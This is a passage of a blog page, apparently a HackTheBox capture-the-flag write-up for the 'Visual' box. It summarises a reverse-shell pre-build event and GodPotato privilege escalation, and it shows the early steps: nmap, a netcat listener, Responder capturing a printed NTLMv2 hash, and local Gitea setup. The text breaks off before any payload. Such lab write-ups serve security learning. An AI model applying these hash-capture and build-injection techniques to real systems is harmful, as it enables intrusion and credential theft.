<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Visual is a medium difficulty box, offering a service to compile Visual Studio projects from any git-based repository. By hosting our own git server, we can supply a malicious project, where we insert a reverse shell payload as a pre-build event. With the shell connection to the box, we can upload a reverse shell php file in the web root, and control as NT Authority\\Local Service. FullPowers allows us to retrieve extra privileges, and we can use GodPotato to escalate to SYSTEM level authority.">
<title>HackTheBox - Visual</title>

<link rel='canonical' href='http://localhost:1313/p/hackthebox-visual/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - Visual">
<meta property='og:description' content="Visual is a medium difficulty box, offering a service to compile Visual Studio projects from any git-based repository. By hosting our own git server, we can supply a malicious project, where we insert a reverse shell payload as a pre-build event. With the shell connection to the box, we can upload a reverse shell php file in the web root, and control as NT Authority\\Local Service. FullPowers allows us to retrieve extra privileges, and we can use GodPotato to escalate to SYSTEM level authority.">
<meta property='og:url' content='http://localhost:1313/p/hackthebox-visual/'>
<meta property='og:site_name' content='Spencer&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Gitea' /><meta property='article:tag' content='Visual Studio' /><meta property='article:tag' content='FullPowers' /><meta property='article:tag' content='GodPotato' /><meta property='article:tag' content='dotnet' /><meta property='article:published_time' content='2024-02-24T22:18:54-05:00'/><meta property='article:modified_time' content='2024-02-24T22:18:54-05:00'/><meta property='og:image' content='http://localhost:1313/p/hackthebox-visual/Visual.png' />
<meta name="twitter:title" content="HackTheBox - Visual">
<meta name="twitter:description" content="Visual is a medium difficulty box, offering a service to compile Visual Studio projects from any git-based repository. By hosting our own git server, we can supply a malicious project, where we insert a reverse shell payload as a pre-build event. With the shell connection to the box, we can upload a reverse shell php file in the web root, and control as NT Authority\\Local Service. FullPowers allows us to retrieve extra privileges, and we can use GodPotato to escalate to SYSTEM level authority."><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='http://localhost:1313/p/hackthebox-visual/Visual.png' />
    <link rel="shortcut icon" href="/favicon.png" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu897059592634026878.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üç•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/post' >
                
                
                
                <span>Posts</span>
            </a>
        </li>
        
        
        <li >
            <a href='/awards' >
                
                
                
                <span>Trophy Room</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#enumeration">Enumeration</a>
      <ol>
        <li><a href="#troubleshooting-the-git-repo-building">Troubleshooting the Git Repo building</a>
          <ol>
            <li><a href="#setting-up-a-self-hosted-gitea-server">Setting up a self-hosted Gitea server</a></li>
            <li><a href="#supplying-a-visual-studio-project">Supplying a Visual Studio project</a></li>
            <li><a href="#creating-a-simple-dotnet-project">Creating a simple dotnet project</a></li>
          </ol>
        </li>
        <li><a href="#exploiting-vss-pre-build-event">Exploiting VS&rsquo;s pre-build event</a></li>
      </ol>
    </li>
    <li><a href="#lateral-movement">Lateral Movement</a></li>
    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/hackthebox-visual/">
                <img src="/p/hackthebox-visual/Visual_hu17017901347510341509.png"
                        srcset="/p/hackthebox-visual/Visual_hu17017901347510341509.png 800w, /p/hackthebox-visual/Visual_hu6049949748561355677.png 1600w"
                        width="800" 
                        height="606" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Visual" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/hack-the-box/" >
                Hack the Box
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/hackthebox-visual/">HackTheBox - Visual</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            Visual is a medium difficulty box, offering a service to compile Visual Studio projects from any git-based repository. By hosting our own git server, we can supply a malicious project, where we insert a reverse shell payload as a pre-build event. With the shell connection to the box, we can upload a reverse shell php file in the web root, and control as NT Authority\Local Service. FullPowers allows us to retrieve extra privileges, and we can use GodPotato to escalate to SYSTEM level authority.
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Feb 24, 2024</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    10 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="enumeration">Enumeration
</h2><p>Initial nmap:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.129.144.164
</span></span><span class="line"><span class="cl">Host is up (0.076s latency).
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
</span></span><span class="line"><span class="cl">|_http-title: Visual - Revolutionizing Visual Studio Builds
</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds
</span></span></code></pre></td></tr></table>
</div>
</div><p>Visiting the website, we see details on a Visual Studio project:
<img src="/p/hackthebox-visual/Images/landingpage.png"
	width="1335"
	height="584"
	srcset="/p/hackthebox-visual/Images/landingpage_hu13517796549465386004.png 480w, /p/hackthebox-visual/Images/landingpage_hu6859916366197473218.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="228"
		data-flex-basis="548px"
	
>
On the home page, we see interesting options at the bottom including a submission form to provide our own repo:</p>
<p><img src="/p/hackthebox-visual/Images/reposubmitform.png"
	width="1269"
	height="554"
	srcset="/p/hackthebox-visual/Images/reposubmitform_hu15616774604599622299.png 480w, /p/hackthebox-visual/Images/reposubmitform_hu14809649112795073153.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="229"
		data-flex-basis="549px"
	
>
When we provide our system&rsquo;s IP address, we will receive a connection:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">‚îå‚îÄ‚îÄ</span><span class="p">(</span><span class="n">kali</span><span class="err">„âø</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">visual</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">‚îî‚îÄ</span><span class="o">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">nvlp</span> <span class="mi">80</span>
</span></span><span class="line"><span class="cl"><span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">80</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.134</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">144.164</span><span class="p">]</span> <span class="mi">49672</span>
</span></span><span class="line"><span class="cl"><span class="n">GET</span> <span class="o">/</span><span class="n">repo</span><span class="o">/</span><span class="n">info</span><span class="o">/</span><span class="n">refs</span><span class="err">?</span><span class="n">service</span><span class="o">=</span><span class="n">git</span><span class="o">-</span><span class="n">upload</span><span class="o">-</span><span class="n">pack</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.134</span>
</span></span><span class="line"><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">git</span><span class="o">/</span><span class="mf">2.41</span><span class="o">.</span><span class="mf">0.</span><span class="n">windows</span><span class="o">.</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">deflate</span><span class="p">,</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">br</span><span class="p">,</span> <span class="n">zstd</span>
</span></span><span class="line"><span class="cl"><span class="n">Pragma</span><span class="p">:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>
</span></span><span class="line"><span class="cl"><span class="n">Git</span><span class="o">-</span><span class="n">Protocol</span><span class="p">:</span> <span class="n">version</span><span class="o">=</span><span class="mi">2</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Using responder, we can receive an NTLM hash:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/visual]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ sudo responder -I tun0
</span></span><span class="line"><span class="cl">                                         __
</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
</span></span><span class="line"><span class="cl">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
</span></span><span class="line"><span class="cl">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
</span></span><span class="line"><span class="cl">                   |__|
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">[+] Listening for events...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[HTTP] NTLMv2 Client   : 10.129.144.164
</span></span><span class="line"><span class="cl">[HTTP] NTLMv2 Username : VISUAL\enox
</span></span><span class="line"><span class="cl">[HTTP] NTLMv2 Hash     : enox::VISUAL:49ed5e7eb09d8a6d:6A0C757814963C7E2CF4D97DE665A407:010100000000000098A826EAA6F4D9018E894BC5012324680000000002000800300058005600370001001E00570049004E002D00460053003500550036005900590043004A00470047000400140030005800560037002E004C004F00430041004C0003003400570049004E002D00460053003500550036005900590043004A00470047002E0030005800560037002E004C004F00430041004C000500140030005800560037002E004C004F00430041004C000800300030000000000000000000000000300000FB112DC1D7A6EBADEFA202CE1B3B39EEC9982696A12273A639BEAB0E53B514620A001000000000000000000000000000000000000900220048005400540050002F00310030002E00310030002E00310034002E003100330034000000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Unfortunately, the usefulness of this retrieval is limited since only port 80 is open.</p>
<h3 id="troubleshooting-the-git-repo-building">Troubleshooting the Git Repo building
</h3><p>Back to the website, we are detailed an error that reveals it is searching for a <code>.sln</code> file, the core component of a visual studio project
<img src="/p/hackthebox-visual/Images/repoerror.png"
	width="778"
	height="154"
	srcset="/p/hackthebox-visual/Images/repoerror_hu17447318219823638442.png 480w, /p/hackthebox-visual/Images/repoerror_hu3839227301051477672.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="505"
		data-flex-basis="1212px"
	
>
Using a python http server, we can see the request information more clearly. This is not simply downloading a .sln file, but rather trying to clone a <code>git</code> repository. Although it may be possible to emulate a git repo from an http server with the right file configuration, this is beyond my skillset. I opted to install <code>Gitea</code> locally, so I can host my own server that  the machine can pull from.
Note that these HTB machines are isolated from the broad internet, so pulling from a public web service like github will not be possible.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">‚îå‚îÄ‚îÄ</span><span class="p">(</span><span class="n">kali</span><span class="err">„âø</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">visual</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">‚îî‚îÄ</span><span class="o">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>                                                
</span></span><span class="line"><span class="cl"><span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="mf">10.129</span><span class="o">.</span><span class="mf">144.164</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">01</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">16</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="n">code</span> <span class="mi">404</span><span class="p">,</span> <span class="n">message</span> <span class="ne">File</span> <span class="ow">not</span> <span class="n">found</span>
</span></span><span class="line"><span class="cl"><span class="mf">10.129</span><span class="o">.</span><span class="mf">144.164</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">01</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">16</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="s2">&#34;GET /info/refs?service=git-upload-pack HTTP/1.1&#34;</span> <span class="mi">404</span> <span class="o">-</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To set up gitea, I followed <a class="link" href="https://docs.gitea.com/installation/database-prep"  target="_blank" rel="noopener"
    >the preparations from this post.</a> The gitea binary/setup was retrieved from their main site, <a class="link" href="https://about.gitea.com/"  target="_blank" rel="noopener"
    >https://about.gitea.com/</a>. There are many release versions to select, so be sure it matches your system requirements.</p>
<h4 id="setting-up-a-self-hosted-gitea-server">Setting up a self-hosted Gitea server
</h4><p>Before anything, it is necessary to initialize mysql:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ sudo service mysql start
</span></span></code></pre></td></tr></table>
</div>
</div><p>Next, we can enter mysql by invoking sudo:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/visual/test3/MyApp]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ sudo mysql -u root
</span></span><span class="line"><span class="cl">Welcome to the MariaDB monitor.  Commands end with ; or \g.
</span></span><span class="line"><span class="cl">Your MariaDB connection id is 2506
</span></span><span class="line"><span class="cl">Server version: 10.11.4-MariaDB-1 Debian 12
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MariaDB [(none)]&gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, we can follow the instructions to set up a local gitea service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MariaDB [(none)]&gt; use mysql;
</span></span><span class="line"><span class="cl">Reading table information for completion of table and column names
</span></span><span class="line"><span class="cl">You can turn off this feature to get a quicker startup with -A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Database changed
</span></span><span class="line"><span class="cl">MariaDB [mysql]&gt; CREATE USER &#39;gitea&#39;@&#39;%&#39; IDENTIFIED BY &#39;gitea&#39;;
</span></span><span class="line"><span class="cl">Query OK, 0 rows affected (0.019 sec)
</span></span><span class="line"><span class="cl">MariaDB [mysql]&gt; CREATE DATABASE giteadb CHARACTER SET &#39;utf8mb4&#39; COLLATE &#39;utf8mb4_unicode_ci&#39;;
</span></span><span class="line"><span class="cl">Query OK, 1 row affected (0.011 sec)
</span></span><span class="line"><span class="cl">MariaDB [mysql]&gt; GRANT ALL PRIVILEGES ON giteadb.* TO &#39;gitea&#39;;
</span></span><span class="line"><span class="cl">Query OK, 0 rows affected (0.011 sec)
</span></span></code></pre></td></tr></table>
</div>
</div><p>And now, we are ready to initialize gitea. Start by executing the extracted binary:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/gitea]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ ./gitea-1.21-linux-amd64 
</span></span><span class="line"><span class="cl">2023/10/03 20:34:06 cmd/web.go:242:runWeb() [I] Starting Gitea on PID: 66899
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">2023/10/03 20:34:06 cmd/web.go:304:listen() [I] Listen: http://0.0.0.0:3000
</span></span><span class="line"><span class="cl">2023/10/03 20:34:06 cmd/web.go:308:listen() [I] AppURL(ROOT_URL): http://localhost:3000/
</span></span><span class="line"><span class="cl">2023/10/03 20:34:06 ...s/graceful/server.go:70:NewServer() [I] Starting new Web server: tcp:0.0.0.0:3000 on PID: 66899
</span></span></code></pre></td></tr></table>
</div>
</div><p>This execution sets the gitea service on port 3000. Before we can start running, we need to configure it to use our MySQL server. Below is the completed form for myself. Note the password will be whatever you made the IDENTIFIED BY parameter during the database setup. In this scenario, it is <code>gitea</code>.
<img src="/p/hackthebox-visual/Images/giteaconfig.png"
	width="1156"
	height="660"
	srcset="/p/hackthebox-visual/Images/giteaconfig_hu16535368444935306608.png 480w, /p/hackthebox-visual/Images/giteaconfig_hu4060108654460819858.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="175"
		data-flex-basis="420px"
	
>
Press &ldquo;Install Gitea&rdquo; at the bottom of the page, and setup will be complete.
After it all, we finally have our own gitea service set up and running:
<img src="/p/hackthebox-visual/Images/gitea1.png"
	width="1413"
	height="558"
	srcset="/p/hackthebox-visual/Images/gitea1_hu4783207209338854185.png 480w, /p/hackthebox-visual/Images/gitea1_hu7950845672939195876.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="253"
		data-flex-basis="607px"
	
>
Now we can put whatever we want for an account, host our own repos, and even share them with whoever can access our system. Since I made this with the exclusive purpose of interacting with the box, I just made my account using the completely original <code>asdf</code> credentials.</p>
<h4 id="supplying-a-visual-studio-project">Supplying a Visual Studio project
</h4><p>I don&rsquo;t typically do visual studio things, but I have an old Chip8 project that was built with visual studio. I cloned this repo, then submitted a copy to this local gitea server:
<img src="/p/hackthebox-visual/Images/test1.png"
	width="594"
	height="482"
	srcset="/p/hackthebox-visual/Images/test1_hu8117015098354166398.png 480w, /p/hackthebox-visual/Images/test1_hu10143840387960997087.png 1024w"
	loading="lazy"
	
		alt="Chip8 project repo, for testing the build process"
	
	
		class="gallery-image" 
		data-flex-grow="123"
		data-flex-basis="295px"
	
>
Other <code>.sln</code> sources can probably be easily obtained, or even creating one by launching Visual Studio if that is an option.
When we send this to build, we can see a new error message:</p>
<p><img src="/p/hackthebox-visual/Images/builderror.png"
	width="1084"
	height="373"
	srcset="/p/hackthebox-visual/Images/builderror_hu6450568027368554359.png 480w, /p/hackthebox-visual/Images/builderror_hu8165027005297690096.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="290"
		data-flex-basis="697px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
